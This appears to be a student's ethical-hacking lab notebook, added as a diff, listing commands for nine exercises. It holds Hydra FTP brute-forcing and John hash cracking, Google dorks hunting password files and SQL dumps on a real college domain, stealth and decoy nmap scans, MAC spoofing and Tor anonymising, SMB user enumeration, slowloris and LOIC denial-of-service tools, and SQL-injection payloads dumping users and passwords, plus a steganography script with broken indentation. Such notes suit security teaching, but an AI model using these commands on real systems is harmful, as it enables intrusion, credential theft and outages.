@@ -1,0 +1,204 @@
+
+exp1
+crunch 4 6 abc123 -o mywordlist.txt
+
+Hydra:
+ifconfig
+nmap -sV 10.0.2.4 (check ports)
+ping 10.0.2.4
+hydra -l msfadmin -P mywordlist.txt 10.0.2.4 ftp -V
+
+hashid <hash>
+echo "d9f6e636e369552839e7bb8057aeb8da" > hash.txt
+john --format=raw-md5 --wordlist=mywordlist.txt hash.txt
+
+exp2
+
+whois tce.edu
+archive.org -> tce.edu
+Netcraft -- microsoft.com
+site:tce.edu filetype:pdf
+site:tce.edu inurl:scope
+site:tce.edu intitle:"Index of"
+site:tce.edu inurl:"Login"
+site:tce.edu filetype:xlsx
+cache:tce.edu
+link:tce.edu
+site:tce.edu filetype:sql
+site:tce.edu intitle:"Password file" filetype:txt
+site:tce.edu intext:Confidential
+site:*.tce.edu -www
+filetype:bak or filetype:old or filetype:backup site:tce.edu
+intitle:"restricted" site:tce.edu
+
+Active Recon:
+host tce.edu
+dig tce.edu mx
+dig tce.edu ANY
+dig -x 10.0.2.4
+dig @ns1-07.azure-dns.com example.com AXFR
+
+exp3
+
+nmap -sn -PE 10.0.2.4(icmp echo request)
+nmap -sn -PP 10.0.2.4(time stamp request)
+nmap -sn -PM 10.0.2.4(netmask request)
+nmap -sn -PS22,80,443 10.0.2.4(TCP Ping sweep)
+namp -sn -PU53,161 10.0.2.4(UDP ping sweep)
+sudo nmap -sn -PS80,443 -PU53,161 10.0.2.4(combined tcp and udp)
+nmap -n -sn 10.0.2.4(-n denotes disabling reverse DNS lookup)
+nmap -sT 10.0.2.4(tcp connect scan full scan)
+namp -sS 10.0.2.4 (tcp half scan only syn packet )
+nmap -sS -f 10.0.2.4(-f stealth scan fragmentation)
+nmap -sS -D RND:5 10.0.2.4(Decoy scan sent from random multiple ports)
+nmap -Pn -b anonymous:anonymous@10.0.2.4(ftp bounce scan)<ftprelay>:<ftppass> <targetip>
+nmap -A 10.0.2.4(Aggressive detection add info about os)
+nmap -sV 10.0.2.4(service version detection)
+nmap -O 10.0.2.4(Os detection)
+nmap -p 21,22,80,443 10.0.2.4(scan specific ports)
+
+exp 4
+
+ls /usr/share/namp/scripts/
+namp --script=<command> -p 80 <ip address>
+macchanger
+ifconfig eth0
+sudo ifconfig eth0 down(turn off network interface)
+sudo macchanger -r eth0(random mac address)
+sudo ifconfig eth0(up)
+macchanger -s eth0(verify the new mac)
+
+hideme
+
+tor
+sudo apt install tor proxychains
+sudo service tor start
+sudo nano/etc/proxychains.conf
+ensure the line is present at the end
+socks4 127.0.0.1 9050 
+proxychains nmap -sT 10.0.2.4
+proxychains curl http://example.com
+
+user enumeration
+enum4linux -a target ip
+enum4clinet -u " -p " 10.0.2.4
+rpcclient -U "" -N 10.0.2.4
+enumdomusers
+queryuser<rid>
+getdompwinfo
+ftp targetip
+get sample.txt
+exp 5
+
+X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*(eicar.com)'
+@echo off
+ipconfig /release (disconnect.bat)
+@echo off
+ipconfig /renew(reconnect.bat)
+X=MsgBox("Your text here", 0+64, "Title")(popup.vbs)
+do
+X=MsgBox("Virus Spreading", 0+48, "Virus Warning")
+loop(endlesslopp)
+
+sudo settoolkit
+1
+2
+3
+2
+
+EXP 8
+slowloris 
+git clone https://github.com/GHubgenius/slowloris.git
+cd slowloris.pl
+ls
+perl slowloris.pl -dns <iipadrress> -port no - timeout 30 -num 500
+
+loic
+sourceforge
+sudo apt install mono-complete
+cd downloads
+pwd
+ls
+mono LOIC.exe
+top
+
+
+
+
+EXP 9
+
+<script>alert('XSS Successful!')</script>(xss scripting)
+SQL injection
+1' OR '1'='1--
+1' UNION SELECT null, database() #
+1' UNION SELECT user, password FROM users #                                        
+1' UNION SELECT null, table_name FROM information_schema.tables WHERE table_schema=database() # extract table names
+
+
+exp 6
+
+from tkinter import Tk, filedialog, Label, Button, Text, END
+from PIL import Image
+import os
+def embed_text():
+# select image
+image_path = filedialog.askopenfilename(title="Select an Image", filetypes=[("Image files", "*.png;*.jpg;*.bmp")])
+if not image_path:
+return
+secret_text = text_box.get("1.0", END).strip()
+if not secret_text:
+result_label.config(text="Enter some text to hide!")
+return
+img = Image.open(image_path)
+encoded = img.copy()
+width, height = img.size
+index = 0
+# Convert text to binary + length
+binary_secret = ''.join(format(ord(i), '08b') for i in secret_text)
+binary_secret = format(len(binary_secret), '016b') + binary_secret
+for row in range(height):
+for col in range(width):
+if index < len(binary_secret):
+pixel = list(img.getpixel((col, row)))
+pixel[0] = pixel[0] & ~1 | int(binary_secret[index]) # LSB of red channel
+encoded.putpixel((col, row), tuple(pixel))
+index += 1
+else:
+break
+if index >= len(binary_secret):
+break
+save_path = os.path.splitext(image_path)[0] + "_stego.png"
+encoded.save(save_path)
+result_label.config(text=f"Text embedded and saved as {save_path}")
+def extract_text():
+# select stego image
+image_path = filedialog.askopenfilename(title="Select Stego Image", filetypes=[("Image files", "*.png;*.jpg;*.bmp")])
+if not image_path:
+return
+img = Image.open(image_path)
+width, height = img.size
+binary_data = ""
+index = 0
+for row in range(height):
+for col in range(width):
+pixel = img.getpixel((col, row))
+binary_data += str(pixel[0] & 1)
+index += 1
+msg_len = int(binary_data[:16], 2)
+data_bits = binary_data[16:16+msg_len]
+secret_text = ""
+for i in range(0, len(data_bits), 8):
+byte = data_bits[i:i+8]
+secret_text += chr(int(byte, 2))
+result_label.config(text=f"Extracted: {secret_text}")
+# GUI setup
+root = Tk()
+root.title("Image Steganography - LSB")
+Label(root, text="Enter text to hide:").pack()
+text_box = Text(root, height=5, width=50)
+text_box.pack()
+Button(root, text="Embed Text in Image", command=embed_text).pack(pady=5)
+Button(root, text="Extract Text from Image", command=extract_text).pack(pady=5)
+result_label = Label(root, text="", fg="blue", wraplength=400)
+result_label.pack()
+root.mainloop()
